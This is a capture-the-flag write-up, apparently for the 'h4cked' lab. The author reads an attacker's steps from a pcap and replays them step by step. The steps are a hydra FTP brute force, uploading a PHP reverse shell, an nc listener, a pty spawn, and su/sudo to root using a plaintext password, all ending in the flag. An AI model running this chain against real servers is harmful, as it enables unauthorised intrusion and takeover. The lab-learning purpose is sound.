Description: Find out what happened by analysing a .pcap file and hack your way back into the machine

From the above description, we know we need wireshark so we downloaded the file and opened it up using wireshark

we see a lot of `ftp` and `tcp` protocols

we followed the packet streams and voila~ we get what we need

bash history, essentially we can replicate the attack given it is not patched

[FTP TCP Stream](https://www.notion.so/FTP-TCP-Stream-20d9c541337a809aab66e9939a484084?pvs=21)

[TCP Stream after handshake](https://www.notion.so/TCP-Stream-after-handshake-20d9c541337a805a8d05e682c4b66149?pvs=21)

All we needed to do was to replicate this

Firstly we need to log onto the ftp server to download the file to modify it as we cannot modify it as jenny

```jsx
**┌──(namura㉿namu)-[~]
└─$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt ip_address ftp**
```

And we get the passwd yay~

then we log onto the server as jenny

if we dont know `jenny` then we can maybe list the users using smbclient or maybe enum4linux or maybe just nmapping with a few scripts

Okay so then we hit `ls`

```jsx
ftp> ls -la
229 Entering Extended Passive Mode (|||27934|)
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Feb 01  2021 .
drwxr-xr-x    3 0        0            4096 Feb 01  2021 ..
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5492 Jun 09 10:03 shell.php
226 Directory send OK.
```

Fair enough we get this, obviously we see cant modify any thing, a few checks were done

```jsx
ftp> ls
229 Entering Extended Passive Mode (|||17635|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> ls /root/Reptile
229 Entering Extended Passive Mode (|||42656|)
150 Here comes the directory listing.
226 Transfer done (but failed to open directory).
ftp> user 
(username) jenny
331 Any password will do.
Password: 
230 Already logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> syst
215 UNIX Type: L8
ftp> pwd
Remote directory: /var/www/html
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> passive
Passive mode: on; fallback to active mode: on.
```

Then we modify the `shell.php` file by downloading it on our local device

```jsx
ftp> mget *
mget index.html [anpqy?]? 
229 Entering Extended Passive Mode (|||47422|)
150 Opening BINARY mode data connection for index.html (10918 bytes).
100% |***********************************************************| 10918        5.85 MiB/s    00:00 ETA
226 Transfer complete.
10918 bytes received in 00:00 (58.78 KiB/s)

mget shell.php [anpqy?]? 229 Entering Extended Passive Mode (|||24765|)
150 Opening BINARY mode data connection for shell.php (5493 bytes).
100% |***********************************************************|  5493       50.37 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes received in 00:00 (29.28 KiB/s)
```

Then on the local device we edit the ip and port to match our tunnel ip and the port where we want to listen to, in my case `4444`

```jsx
┌──(namura㉿namu)-[~/thm/h4cked]
└─$ vim shell.php          
                                                                                                        
┌──(namura㉿namu)-[~/thm/h4cked]
└─$ ll
total 140
-rw-rw-r-- 1 namura namura 119788 Jun  8 17:06 Capture_1612220005488.pcapng
-rw-rw-r-- 1 namura namura  10918 Feb  2  2021 index.html
-rwxrwxrwx 1 namura namura   5494 Jun  9 15:56 shell.php

```

Then on the remote ftp server, we put the file from our local device, and we also chmod it to `777`

```jsx
ftp> put shell.php 
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||51636|)
150 Ok to send data.
100% |***********************************************************|  5492       34.00 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (14.53 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||8000|)
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Feb 01  2021 .
drwxr-xr-x    3 0        0            4096 Feb 01  2021 ..
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5492 Jun 09 10:03 shell.php
226 Directory send OK.
ftp> chmod 777 shell.php
200 SITE CHMOD command ok.

```

Now, we listen to port `4444` on the local device and wait for a reverse shell

```jsx
nc -lnvp 4444
```

Then on the browser, we visit the webpage, and we go to the file `/shell.php`

Its because we know it is hosted on `/var/www/html` so we simply put the address

`https://ip_address/shell.php`

Then we get a reverse shell yay~

we spawn a pretty shell

```jsx
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

we log in as `www-data`

```jsx
www-data@wir3:/$ ls -la
ls -la
total 1529952
drwxr-xr-x  22 root root       4096 Feb  2  2021 .
drwxr-xr-x  22 root root       4096 Feb  2  2021 ..
drwxr-xr-x   2 root root       4096 Feb  1  2021 bin
drwxr-xr-x   3 root root       4096 Feb  1  2021 boot
drwxr-xr-x  15 root root       3700 Jun  9 09:51 dev
drwxr-xr-x  94 root root       4096 Feb  2  2021 etc
drwxr-xr-x   3 root root       4096 Feb  1  2021 home
lrwxrwxrwx   1 root root         34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1  2021 lib
drwxr-xr-x   2 root root       4096 Feb  1  2021 lib64
drwx------   2 root root      16384 Feb  1  2021 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 114 root root          0 Jun  9 09:51 proc
drwx------   3 root root       4096 Feb  2  2021 root
drwxr-xr-x  27 root root        840 Jun  9 09:52 run
drwxr-xr-x   2 root root      12288 Feb  1  2021 sbin
drwxr-xr-x   3 root root       4096 Feb  1  2021 srv
-rw-------   1 root root 1566572544 Feb  1  2021 swap.img
dr-xr-xr-x  13 root root          0 Jun  9 10:17 sys
drwxrwxrwt   2 root root       4096 Jun  9 09:51 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  13 root root       4096 Feb  2  2021 var
lrwxrwxrwx   1 root root         31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
www-data@wir3:/$ cat /etc/sudoers
cat /etc/sudoers
cat: /etc/sudoers: Permission denied
www-data@wir3:/$ whoami
whoami
www-data

```

Then we switch user to `jenny` using the same passwd from ftp, performing some preliminary checks

on additional note ssh port wasnt open

```jsx
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ ls -la
ls -la
total 1529952
drwxr-xr-x  22 root root       4096 Feb  2  2021 .
drwxr-xr-x  22 root root       4096 Feb  2  2021 ..
drwxr-xr-x   2 root root       4096 Feb  1  2021 bin
drwxr-xr-x   3 root root       4096 Feb  1  2021 boot
drwxr-xr-x  15 root root       3700 Jun  9 09:51 dev
drwxr-xr-x  94 root root       4096 Feb  2  2021 etc
drwxr-xr-x   3 root root       4096 Feb  1  2021 home
lrwxrwxrwx   1 root root         34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1  2021 lib
drwxr-xr-x   2 root root       4096 Feb  1  2021 lib64
drwx------   2 root root      16384 Feb  1  2021 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 119 root root          0 Jun  9 09:51 proc
drwx------   3 root root       4096 Feb  2  2021 root
drwxr-xr-x  27 root root        840 Jun  9 09:52 run
drwxr-xr-x   2 root root      12288 Feb  1  2021 sbin
drwxr-xr-x   3 root root       4096 Feb  1  2021 srv
-rw-------   1 root root 1566572544 Feb  1  2021 swap.img
dr-xr-xr-x  13 root root          0 Jun  9 10:17 sys
drwxrwxrwt   2 root root       4096 Jun  9 09:51 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  13 root root       4096 Feb  2  2021 var
lrwxrwxrwx   1 root root         31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
jenny@wir3:/$ whoami
whoami
jenny
jenny@wir3:/$ cat /etc/sudoers
cat /etc/sudoers
cat: /etc/sudoers: Permission denied
jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ find -type f -name wir3 2>/dev/null
find -type f -name wir3 2>/dev/null

```

The other part was fairly simple, just switching to `root`

And we cloned the rootkit repo `Reptile` to the user `jenny` as it had `git`

```jsx
jenny@wir3:/$ sudo su
sudo su
[sudo] password for jenny: 987654321 

root@wir3:/# ls -la
ls -la
total 1529952
drwxr-xr-x  22 root root       4096 Jun  9 10:28 .
drwxr-xr-x  22 root root       4096 Jun  9 10:28 ..
drwxr-xr-x   2 root root       4096 Feb  1  2021 bin
drwxr-xr-x   3 root root       4096 Feb  1  2021 boot
drwxr-xr-x  15 root root       3700 Jun  9 09:51 dev
drwxr-xr-x  94 root root       4096 Feb  2  2021 etc
drwxr-xr-x   3 root root       4096 Feb  1  2021 home
lrwxrwxrwx   1 root root         34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1  2021 lib
drwxr-xr-x   2 root root       4096 Feb  1  2021 lib64
drwx------   2 root root      16384 Feb  1  2021 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 125 root root          0 Jun  9 09:51 proc
drwx------   3 root root       4096 Feb  2  2021 root
drwxr-xr-x  27 root root        840 Jun  9 09:52 run
drwxr-xr-x   2 root root      12288 Feb  1  2021 sbin
drwxr-xr-x   3 root root       4096 Feb  1  2021 srv
-rw-------   1 root root 1566572544 Feb  1  2021 swap.img
dr-xr-xr-x  13 root root          0 Jun  9 10:17 sys
-rw-r--r--   1 root root          0 Jun  9 10:24 test
drwxrwxrwt   2 root root       4096 Jun  9 10:22 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  13 root root       4096 Feb  2  2021 var
lrwxrwxrwx   1 root root         31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
root@wir3:/# cd root    
cd root
root@wir3:~# ll
ll
total 20
drwx------  3 root root 4096 Feb  2  2021 ./
drwxr-xr-x 22 root root 4096 Jun  9 10:28 ../
lrwxrwxrwx  1 root root    9 Feb  2  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  7 root root 4096 Feb  2  2021 Reptile/
root@wir3:~# cd Reptile 
cd Reptile
root@wir3:~/Reptile# ll
ll
total 44
drwxr-xr-x 7 root root 4096 Feb  2  2021 ./
drwx------ 3 root root 4096 Feb  2  2021 ../
drwxr-xr-x 2 root root 4096 Feb  1  2021 configs/
-rw-r--r-- 1 root root   33 Feb  2  2021 flag.txt
-rw-r--r-- 1 root root 1922 Feb  1  2021 Kconfig
drwxr-xr-x 7 root root 4096 Feb  1  2021 kernel/
-rw-r--r-- 1 root root 1852 Feb  1  2021 Makefile
drwxr-xr-x 2 root root 4096 Feb  1  2021 output/
-rw-r--r-- 1 root root 2183 Feb  1  2021 README.md
drwxr-xr-x 4 root root 4096 Feb  1  2021 scripts/
drwxr-xr-x 6 root root 4096 Feb  1  2021 userland/
root@wir3:~/Reptile# cat flag.txt
cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
root@wir3:~/Reptile# 

```

Simply just viewing the contents of `/root/root.txt` gives us the flag

### And that’s it for this room, thanks for surfing